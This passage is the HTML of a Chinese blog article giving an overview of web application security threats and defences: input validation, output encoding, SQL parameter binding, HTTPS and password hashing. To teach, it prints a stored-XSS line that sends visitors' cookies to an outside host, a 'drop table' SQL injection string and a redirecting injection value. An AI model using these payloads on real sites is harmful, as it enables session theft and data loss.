@@ -1,0 +1,1570 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
+    <meta name="description" content="">
+    <title>互联网应用安全威胁及应对方法 · 智乐活</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180317 as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" type="text/css" href= /css/mobile.css?v=20180317 media="(max-width: 980px)"/>
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        
+    <link rel="icon" href= /assets/img/favicon.ico>
+    <script>
+        (function (w) {
+            "use strict";
+            // rel=preload support test
+            if (!w.loadCSS) {
+                w.loadCSS = function () { };
+            }
+            // define on the loadCSS obj
+            var rp = loadCSS.relpreload = {};
+            // rel=preload feature support test
+            // runs once and returns a function for compat purposes
+            rp.support = (function () {
+                var ret;
+                try {
+                    ret = w.document.createElement("link").relList.supports("preload");
+                } catch (e) {
+                    ret = false;
+                }
+                return function () {
+                    return ret;
+                };
+            })();
+
+            // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+            // then change that media back to its intended value on load
+            rp.bindMediaToggle = function (link) {
+                // remember existing media attr for ultimate state, or default to 'all'
+                var finalMedia = link.media || "all";
+
+                function enableStylesheet() {
+                    link.media = finalMedia;
+                }
+
+                // bind load handlers to enable media
+                if (link.addEventListener) {
+                    link.addEventListener("load", enableStylesheet);
+                } else if (link.attachEvent) {
+                    link.attachEvent("onload", enableStylesheet);
+                }
+
+                // Set rel and non-applicable media type to start an async request
+                // note: timeout allows this to happen async to let rendering continue in IE
+                setTimeout(function () {
+                    link.rel = "stylesheet";
+                    link.media = "only x";
+                });
+                // also enable media after 3 seconds,
+                // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+                setTimeout(enableStylesheet, 3000);
+            };
+
+            // loop through link elements in DOM
+            rp.poly = function () {
+                // double check this to prevent external calls from running
+                if (rp.support()) {
+                    return;
+                }
+                var links = w.document.getElementsByTagName("link");
+                for (var i = 0; i < links.length; i++) {
+                    var link = links[i];
+                    // qualify links to those with rel=preload and as=style attrs
+                    if (link.rel === "preload" && link.getAttribute("as") === "style" && !link.getAttribute("data-loadcss")) {
+                        // prevent rerunning on link
+                        link.setAttribute("data-loadcss", true);
+                        // bind listeners to toggle media back
+                        rp.bindMediaToggle(link);
+                    }
+                }
+            };
+
+            // if unsupported, run the polyfill
+            if (!rp.support()) {
+                // run once at least
+                rp.poly();
+
+                // rerun poly on an interval until onload
+                var run = w.setInterval(rp.poly, 500);
+                if (w.addEventListener) {
+                    w.addEventListener("load", function () {
+                        rp.poly();
+                        w.clearInterval(run);
+                    });
+                } else if (w.attachEvent) {
+                    w.attachEvent("onload", function () {
+                        rp.poly();
+                        w.clearInterval(run);
+                    });
+                }
+            }
+            // commonjs
+            if (typeof exports !== "undefined") {
+                exports.loadCSS = loadCSS;
+            }
+            else {
+                w.loadCSS = loadCSS;
+            }
+        }(typeof global !== "undefined" ? global : this));
+    </script>
+    <script src="//cdn.staticfile.org/jquery/3.2.1/jquery.min.js" defer></script>
+    <script src="/scripts/main.js" defer></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >智乐活</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">互联网应用安全威胁及应对方法</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>智乐活</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            互联网应用安全威胁及应对方法
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "安全">安全</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2018/04/20</span>
+                
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                    <span class="shareText">Share</span>
+                    <ul class="shareList">
+                        <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                            <div class="share-qrcode"></div>
+                        </li>
+                        <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                        <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                        <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                        <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                    </ul>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <script>
+  // load webfont-loader async, and add callback function
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+  
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+      if (postIntroTags) {
+        postIntroTags.classList.add('post-fade-in');
+      }
+      if (postIntroMeat) {
+        postIntroMeat.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  async("https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", asyncCb)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="互联网应用安全威胁的应对"><a href="#互联网应用安全威胁的应对" class="headerlink" title="互联网应用安全威胁的应对"></a>互联网应用安全威胁的应对</h1><blockquote>
+<p>written by xiaokaiqun, 2018-04-20</p>
+</blockquote>
+<p>在 <a href="https://tower.im/projects/a85f31ca53234c639d7b32c8c8155cf3/uploads/606489e79a0c4525ae014dba693ac79f?version=1" target="_blank" rel="noopener">《大型网站技术架构》</a> 一书中提到：<strong>安全</strong>、<strong>高可用</strong>、<strong>可拓展</strong>、<strong>性能</strong>、<strong>可伸缩</strong>是衡量一个网站架构能力的五个方面。其中，安全是必不可少的组成部分。</p>
+<p>由于我之前对安全问题的理解都比较碎片化，不够系统，最近就有针对性的看了一些资料，并将它们整理在这里，希望读者看完后能了解常见的安全威胁和应对方法，并运用到实际生产中去。</p>
+<p>本文是安全问题的总览，对某些问题的深入探讨我们会单独写一篇文章进行讨论。</p>
+<p>参考资料包括：</p>
+<p><a href="https://martinfowler.com/articles/web-security-basics.html#AuthenticateUsersSafely" target="_blank" rel="noopener">1.MartinFowler的博客</a></p>
+<p><a href="https://tower.im/projects/a85f31ca53234c639d7b32c8c8155cf3/uploads/606489e79a0c4525ae014dba693ac79f?version=1" target="_blank" rel="noopener">2.《大型网站技术架构》中的</a> </p>
+<p><a href="https://tower.im/projects/a85f31ca53234c639d7b32c8c8155cf3/uploads/32368b5189ea43d2a382692e551c5762?version=1" target="_blank" rel="noopener">3.《阿里巴巴Java开发手册》中的“安全规约”</a></p>
+<p>4.<a href="https://mp.weixin.qq.com/s/hd7j_mRwzDUBXHfD7LDgAw" target="_blank" rel="noopener">一篇微信文章《互联网安全威胁及应对方案》</a></p>
+<hr>
+<p>安全威胁有很多种类，应对手段也分很多种类。某些威胁可能用很多种手段都能有效应对，而某些手段也能同时应对多种威胁。实际上它们是多对多的关系，如下图：</p>
+<p><img src="http://onpyrjcca.bkt.clouddn.com/security_1.png" alt=""></p>
+<p>本文会以应对手段为线索去总结，这种应对手段能够对付何种威胁，且要做到有效防御我们需要付出哪些努力。这种讲述逻辑的好处是：更贴近生产实际，便于大家运用、实践。</p>
+<p>为了保证应用安全性，我们需要做到以下几点：</p>
+<ul>
+<li>【输入】有效验证用户输入参数 / 拒绝非法输入参数</li>
+<li>【输出】输出安全过滤后的用户数据</li>
+<li>【数据库】使用参数绑定防止SQL注入</li>
+<li>【传输】全面使用HTTPS</li>
+<li>【密码】加密存储用户密码</li>
+<li>【验证身份】正确验证用户身份和管理Session</li>
+<li>【权限校验】验证用户有权进行某种操作</li>
+<li>【防止恶意访问】防接口被刷&amp;风控</li>
+<li>【漏洞】扫描系统和软件漏洞</li>
+</ul>
+<hr>
+<h3 id="【输入】有效验证用户输入参数-拒绝非法输入参数"><a href="#【输入】有效验证用户输入参数-拒绝非法输入参数" class="headerlink" title="【输入】有效验证用户输入参数 / 拒绝非法输入参数"></a>【输入】有效验证用户输入参数 / 拒绝非法输入参数</h3><p>互联网在线服务的实现方式大多是接收用户 <strong>输入=&gt;处理=&gt;输出</strong> 的过程。在输入这一环节，<strong>后端</strong>应用必须对参数进行有效性验证，否则可能存在如下威胁：</p>
+<ul>
+<li>XSS攻击</li>
+<li>各种拒绝服务攻击（DOS）</li>
+<li>各种注入攻击</li>
+<li>CSRF</li>
+<li>资源盗链</li>
+<li>垃圾信息</li>
+</ul>
+<blockquote>
+<p>有同学问：我已经在web前端验证过输入参数了，还有必要在后端再验证吗？</p>
+<p>答案是：很有必要。因为攻击者可能通过curl等工具绕过前端验证，直接调用API，此时前端验证形同虚设。</p>
+</blockquote>
+<p>我先简单介绍一下上述几种威胁的概念：</p>
+<h4 id="1-XSS（Cross-Site-Script）攻击"><a href="#1-XSS（Cross-Site-Script）攻击" class="headerlink" title="1. XSS（Cross Site Script）攻击"></a>1. XSS（Cross Site Script）攻击</h4><p>指攻击者通过表单提交HTML页面可执行的脚本代码或脚本的链接。这些内容被保存在网站数据库中。当这些脚本被渲染到其它用户的HTML页面中时会被执行，达到一些非预期的不良后果。</p>
+<p><strong>案例1</strong>：我在逛某论坛时，发个帖子，内容为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Image().src=<span class="string">"http://xiaokaiqun.com/getcookie?cookie="</span>+<span class="built_in">encodeURIComponent</span>(<span class="built_in">document</span>.cookie);</span><br></pre></td></tr></table></figure>
+<p>当其它用户打开帖子时，他的cookie信息就被发到我的服务器了。</p>
+<blockquote>
+<p>常见的XSS手段：<a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">XSS Filter Evasion Cheat Sheet</a> </p>
+</blockquote>
+<h4 id="2-拒绝服务（Denial-of-Service）攻击"><a href="#2-拒绝服务（Denial-of-Service）攻击" class="headerlink" title="2. 拒绝服务（Denial of Service）攻击"></a>2. 拒绝服务（Denial of Service）攻击</h4><p>指攻击者通过手段消耗系统资源，使真实用户无法正常使用服务的攻击。</p>
+<blockquote>
+<p>这里要提一句DDOS攻击：DDOS是分布式的DOS攻击，指用多台机器分布式地对一个网站发起攻击。常见手段是基于TCP SYN FLOOD或 IP RST两种方式。</p>
+<p>公司历史上曾经受到过基于TCP SYN FLOOD的DDOS攻击，这种攻击会向服务器发送大量没用的TCP握手请求，占满服务器的TCP缓冲区，导致正常用户无法建立连接。</p>
+<p>这种攻击的防御手段不在本次的讨论范围之内，回头可能会单独写一篇东西讲述。</p>
+</blockquote>
+<p>DOS具体又包括：</p>
+<ul>
+<li>不合适的参数值造成数据库查询耗费过多的资源（page size、order by）</li>
+<li><a href="https://msdn.microsoft.com/zh-cn/magazine/ff646973.aspx" target="_blank" rel="noopener">正则输入源reDos</a></li>
+<li>传入过多、过长的垃圾内容占满磁盘空间</li>
+</ul>
+<h4 id="3-注入攻击"><a href="#3-注入攻击" class="headerlink" title="3. 注入攻击"></a>3. 注入攻击</h4><p>指攻击者通过输入参数或其它手段传入一些恶意的程序、指令在服务端执行，造成破坏。包括：</p>
+<ul>
+<li>SQL注入</li>
+<li>程序漏洞注入（如：<a href="https://www.cnblogs.com/sevck/p/4967200.html" target="_blank" rel="noopener">Java反序列化注入</a>）</li>
+<li>上传恶意文件</li>
+</ul>
+<p><strong>案例2</strong>：SQL注入</p>
+<p>攻击者首先要掌握网站数据库的表名、字段名等信息。并在提交的参数中加入一些SQL语句指令，这些语句可能会造成破坏、或数据泄露。</p>
+<p>如“ ‘1; drop table user; ”，如果这个输入被拼成SQL语句，可能会得到：</p>
+<p>select * from user where id = 1; drop table user;</p>
+<p>如果它被执行，user表将被删除。</p>
+<h4 id="4-CSRF"><a href="#4-CSRF" class="headerlink" title="4. CSRF"></a>4. CSRF</h4><p>即：跨站请求伪造。指攻击者在自己的网站上嵌入一段被攻击者网站的API调用脚本。当用户访问后，该脚本会往被攻击者网站发送请求，被带上被攻击者域名下的cookie值。</p>
+<p>在用户毫无察觉的情况下，他就执行了一次成功的业务调用，如果这是银行转账的请求，那…T-T</p>
+<h4 id="5-资源盗链"><a href="#5-资源盗链" class="headerlink" title="5. 资源盗链"></a>5. 资源盗链</h4><p>指A站点的资源中有指向B站点资源（图片、视频等）的链接，A站点在没有消耗流量的情况下，为用户提供了商业服务，而B站点却承担了费用。</p>
+<h4 id="6-垃圾信息"><a href="#6-垃圾信息" class="headerlink" title="6. 垃圾信息"></a>6. 垃圾信息</h4><p>包括含有敏感、违法或广告内容的用户生成的数据，可能对网站造成破坏。</p>
+<h4 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h4><p>以上是对五种威胁的简单介绍，那么如何通过<strong>验证输入参数</strong>来做防御呢？</p>
+<p>对于输入参数，有以下几点验证原则：</p>
+<ul>
+<li>根据业务逻辑，为参数设置白名单，拒绝一切不在合法范围内的内容<ul>
+<li>如：用数值范围、长度、正则表达式等去做正向验证</li>
+</ul>
+</li>
+<li>如果找不到准确的白名单，就（借助web框架、中间件的功能）设置黑名单。<ul>
+<li>如：Java的ESAPI；</li>
+<li>Hibernate；</li>
+<li>Spring的内置type safe params in Controller 和Validator interface；</li>
+<li>等，都可以辅助实现输入参数验证；网上有不少使用实例。</li>
+</ul>
+</li>
+<li>在关键业务处使用CSRF token验证<ul>
+<li>在生成页面时生成一个token，并渲染在页面中，提交请求时进行验证。</li>
+</ul>
+</li>
+<li>防盗链：检查Referer头中的域名来源是否合法<ul>
+<li><a href="http://codefine.site/2620.html" target="_blank" rel="noopener">两篇介绍防盗链和跨域访问的博客</a></li>
+</ul>
+</li>
+<li>信息反垃圾过滤：<ul>
+<li>通过敏感词匹配、分类算法和黑名单（Hash或布隆过滤器）的方式实现</li>
+</ul>
+</li>
+<li>验证过程越早进行越好，不要让未经过验证的参数进入业务逻辑。</li>
+<li>“拒绝请求” 优于 “净化（删除部分内容，继续执行）”，因为经过参数净化之后，可能仍然存在安全隐患。</li>
+</ul>
+<hr>
+<h3 id="【输出】输出安全过滤后的用户数据"><a href="#【输出】输出安全过滤后的用户数据" class="headerlink" title="【输出】输出安全过滤后的用户数据"></a>【输出】输出安全过滤后的用户数据</h3><p>MVC模式是常用的web应用开发模式，我们处理后的数据最终会以model的形式传递给View组件，输出到HTML页面中。</p>
+<p>不管是使用JSP技术，还是其他视图模板引擎（如Themeleaf、Velocity等），我们会直接把处理后的数据填写到对应位置，完成页面内容的拼装。</p>
+<p>风险来自浏览器渲染HTML的过程，浏览器竭尽全力渲染HTML的全部内容，即便其中有小的语法错误。所以，未经正确编码/安全过滤的数据进入HTML后，可能会使页面不可用，造成破坏。</p>
+<p><strong>案例3：</strong></p>
+<p>假设我是用JSP技术向HTML页面里输出变量${name}，变量的渲染位置为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).innerText = <span class="string">'$&#123;name&#125;'</span></span><br></pre></td></tr></table></figure>
+<p>如果我将name的值置为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaokaiqun<span class="string">';window.location='</span>http:<span class="comment">//baidu.com/';</span></span><br></pre></td></tr></table></figure>
+<p>这个值未经编码直接进入页面，导致页面直接跳转至百度了。</p>
+<h4 id="最佳实践-1"><a href="#最佳实践-1" class="headerlink" title="最佳实践"></a>最佳实践</h4><p>Martin在他的博客中说，要实现正确的输出编码是件很复杂的事情，因为你首先要搞清楚数据会被输出到什么上下文环境中：</p>
+<ul>
+<li>Javascript</li>
+<li>HTML</li>
+<li>URL</li>
+<li>PDF</li>
+<li>CSS</li>
+<li>SQL</li>
+<li>XML</li>
+<li>…</li>
+</ul>
+<p>不同的上下文对应着不同的codec规则。</p>
+<p>如果是嵌套的上下文环境，则还需要注意编码顺序。</p>
+<p>要正确完成输出编码，需要做到如下几点：</p>
+<ul>
+<li><p>对所有输出的含有潜在风险的用户数据进行编码处理</p>
+</li>
+<li><p>使用框架提供的编码功能</p>
+</li>
+<li><p>避免嵌套的上下文</p>
+</li>
+<li><p>等到输出时再进行编码，不要提前到存储时，因为那时你还不知道该用什么编码</p>
+</li>
+<li><p>避免使用不安全的输出方式，参考下表。</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Framework</th>
+<th>Encoded</th>
+<th>Dangerous</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Generic JS</td>
+<td>innerText</td>
+<td>innerHTML</td>
+</tr>
+<tr>
+<td>JQuery</td>
+<td>text()</td>
+<td>html()</td>
+</tr>
+<tr>
+<td>JSP</td>
+<td>&lt;c:out value=”${variable}”&gt; or ${fn:escapeXml(variable)}</td>
+<td>${variable}</td>
+</tr>
+<tr>
+<td>Thymeleaf</td>
+<td>th:text=”${variable}”</td>
+<td>th:utext=”${variable}”</td>
+</tr>
+<tr>
+<td>Angular</td>
+<td>ng-bind</td>
+<td>ng-bind-html (pre 1.2 and when sceProvider is disabled)</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="【数据库】使用参数绑定防止SQL注入"><a href="#【数据库】使用参数绑定防止SQL注入" class="headerlink" title="【数据库】使用参数绑定防止SQL注入"></a>【数据库】使用参数绑定防止SQL注入</h3><p>参数绑定是用来应对SQL注入的最佳手段。（用了它，你将不需要别的方法应对SQL注入了）</p>
+<p>SQL注入的概念在上文中<strong>案例2</strong>已经介绍过，这节就详细说一下要注意的细节。</p>
+<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>问：为什么参数绑定能避免注入呢？</p>
+<p>答：当你使用setString()方法绑定字符串参数时，它会对该字符串进行转义，对其中的” ‘ “引号改为“ \’ ”，使该参数变成一个合法的字符串，而非断句成为多条SQL命令被执行。而真正的SQL命名部分已经经过了预编译，用户输入的部分不会参与SQL语句的编译过程。</p>
+<h4 id="最佳实践-2"><a href="#最佳实践-2" class="headerlink" title="最佳实践"></a>最佳实践</h4><ul>
+<li><p>JDBC、Hibernate、Mybatis都支持参数绑定，所以务必要用</p>
+<ul>
+<li>禁止用String拼接完整的SQL语句</li>
+</ul>
+</li>
+<li><p>使用参数绑定能够使代码更整洁</p>
+</li>
+<li><p>避免误区：</p>
+<ul>
+<li>存储过程也需要使用参数绑定</li>
+<li>NoSQL数据库（MongoDB、Cassandra）也需要使用参数绑定</li>
+</ul>
+</li>
+<li><p>参考下表正确使用参数绑定功能：</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Framework</th>
+<th>Encoded</th>
+<th>Dangerous</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Raw JDBC</td>
+<td><code>Connection.prepareStatement()</code>used with <code>setXXX()</code> methods and bound parameters for all input.</td>
+<td>Any query or update method called with string concatenation rather than binding.</td>
+</tr>
+<tr>
+<td>PHP / MySQLi</td>
+<td><code>prepare()</code> used with bind_param for all input.</td>
+<td>Any query or update method called with string concatenation rather than binding.</td>
+</tr>
+<tr>
+<td>MongoDB</td>
+<td>Basic CRUD operations such as find(), insert(), with BSON document field names controlled by application.</td>
+<td>Operations, including find, when field names are allowed to be determined by untrusted data or use of Mongo operations such as “$where” that allow arbitrary JavaScript conditions.</td>
+</tr>
+<tr>
+<td>Cassandra</td>
+<td>Session.prepare used with BoundStatement and bound parameters for all input.</td>
+<td>Any query or update method called with string concatenation rather than binding.</td>
+</tr>
+<tr>
+<td>Hibernate / JPA</td>
+<td>Use SQL or JPQL/OQL with bound parameters via setParameter</td>
+<td>Any query or update method called with string concatenation rather than binding.</td>
+</tr>
+<tr>
+<td>ActiveRecord</td>
+<td>Condition functions (find_by, where) if used with hashes or bound parameters, eg:<code>where (foo: bar)where (&quot;foo = ?&quot;, bar)</code></td>
+<td>Condition functions used with string concatenation or interpolation:<code>where(&quot;foo = &#39;#{bar}&#39;&quot;)where(&quot;foo = &#39;&quot; + bar + &quot;&#39;&quot;)</code></td>
+</tr>
+<tr>
+<td>Mybatis</td>
+<td>使用#{}形式，参数不参与编译</td>
+<td>使用${}形式会造成SQL注入</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3 id="【传输】全面使用HTTPS"><a href="#【传输】全面使用HTTPS" class="headerlink" title="【传输】全面使用HTTPS"></a>【传输】全面使用HTTPS</h3><p>接下来是一个大的话题：数据在互联网上传输时的隐私性和完整性。</p>
+<p>隐私性:是指没有人能截获、窃听到互联网上传输的数据内容。</p>
+<p>完整性:是指没有人能篡改传输中的数据。</p>
+<p>对，完成这一伟大目标的正是：HTTPS。</p>
+<blockquote>
+<p>先明确几个概念：</p>
+<p>TLS（Transport Layer Security）协议，是SSL协议的进化版，能够完成对传输层协议的加密。</p>
+<p>HTTPS是HTTP协议对TLS的一种应用。</p>
+</blockquote>
+<p>关于TLS协议的加密原理，我希望日后能再写一篇文章详细解释。</p>
+<p>本文只讨论HTTPS协议的使用中的一些实际问题：</p>
+<h4 id="1-如何申请HTTPS证书？"><a href="#1-如何申请HTTPS证书？" class="headerlink" title="1. 如何申请HTTPS证书？"></a>1. 如何申请HTTPS证书？</h4><p>证书是证明你是该域名所有者的方式。关于证书的更多知识可以参考<a href="https://zhilehuo.github.io/2017/04/20/SSL%20认证体系备忘录/" target="_blank" rel="noopener">《SSL 认证体系备忘录》</a></p>
+<p>目前有很多机构提供免费的证书申请，如我们使用的：LetsEncript。</p>
+<h4 id="2-全面使用HTTPS是否会给服务器带来性能压力？"><a href="#2-全面使用HTTPS是否会给服务器带来性能压力？" class="headerlink" title="2.全面使用HTTPS是否会给服务器带来性能压力？"></a>2.全面使用HTTPS是否会给服务器带来性能压力？</h4><p>确实会比HTTP协议耗费更多的计算资源，但是完全可以承受。</p>
+<p>选择不同的加密算法和协议版本对性能的影响是不同的，可以参考<a href="https://mozilla.github.io/server-side-tls/ssl-config-generator/" target="_blank" rel="noopener">SSL Configuration Generator</a> 和 <a href="https://wiki.mozilla.org/Security/Server_Side_TLS" target="_blank" rel="noopener">Server Side TLS Guide</a> 去配置</p>
+<h4 id="3-如何阻止用户继续使用HTTP？"><a href="#3-如何阻止用户继续使用HTTP？" class="headerlink" title="3.如何阻止用户继续使用HTTP？"></a>3.如何阻止用户继续使用HTTP？</h4><ul>
+<li><p>在服务器上配置redirect规则，举例：</p>
+</li>
+<li><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Nginx location</span></span><br><span class="line"><span class="attribute">if</span> (<span class="variable">$scheme</span> != <span class="string">"https"</span>) &#123;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^</span> https://<span class="variable">$host</span><span class="variable">$uri</span> <span class="literal">permanent</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用HSTS，在响应头中加入：</p>
+</li>
+<li><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Strict-Transport-Security</span>: max-age=15768000</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>会使浏览器自动转换<code>http://</code>为<code>https://</code>，且禁止跳过证书不受信任的警告</p>
+</li>
+</ul>
+<h4 id="4-还有那些最佳实践？"><a href="#4-还有那些最佳实践？" class="headerlink" title="4. 还有那些最佳实践？"></a>4. 还有那些最佳实践？</h4><ul>
+<li>大部分浏览器禁止在https资源下请求http资源，这导致我们必须确认我们使用的第三方资源也能支持https</li>
+<li>切勿在URL中带有敏感信息，否则它可能会暴露在Referer或Log里</li>
+<li>更多最佳实践参考<a href="https://www.owasp.org/index.php/Transport_Layer_Protection_Cheat_Sheet" target="_blank" rel="noopener">OWASP Transport Protection Layer Cheat Sheet</a></li>
+</ul>
+<h4 id="5-如何检测我网站的HTTPS安全性？"><a href="#5-如何检测我网站的HTTPS安全性？" class="headerlink" title="5.如何检测我网站的HTTPS安全性？"></a>5.如何检测我网站的HTTPS安全性？</h4><p> SSL Labs’ <a href="https://www.ssllabs.com/ssltest/" target="_blank" rel="noopener">SSL Server Test</a></p>
+<hr>
+<h3 id="【密码】加密存储用户密码"><a href="#【密码】加密存储用户密码" class="headerlink" title="【密码】加密存储用户密码"></a>【密码】加密存储用户密码</h3><p>保护用户密码不单单关系到本应用的数据安全，由于大部分用户会复用自己的密码，密码泄露可能会导致更大范围的危害。</p>
+<blockquote>
+<p>前几年出现过某知名网站的数据库内容泄露，大量账号密码被公开…后果很严重…</p>
+</blockquote>
+<p>因此，严禁明文存储密码。</p>
+<p>那应该存储什么呢？</p>
+<p>答案是密码的Hash值。</p>
+<blockquote>
+<p>Hash算法是不可逆的摘要算法，如：MD5、SHA1等。算法的计算过程是公开的，但你无法通过摘要值得出信息原文</p>
+</blockquote>
+<p>但是，随着计算机计算能力的提升和GPU集群的使用，常用的MD5、SHA1等摘要算法已经可以被破解了，因此他们不适合作为用户密码的Hash算法了。</p>
+<p>下表是安全Hash算法的选择参考：</p>
+<table>
+<thead>
+<tr>
+<th>Hash Algorithm</th>
+<th>Use for passwords?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>scrypt</td>
+<td>Yes</td>
+</tr>
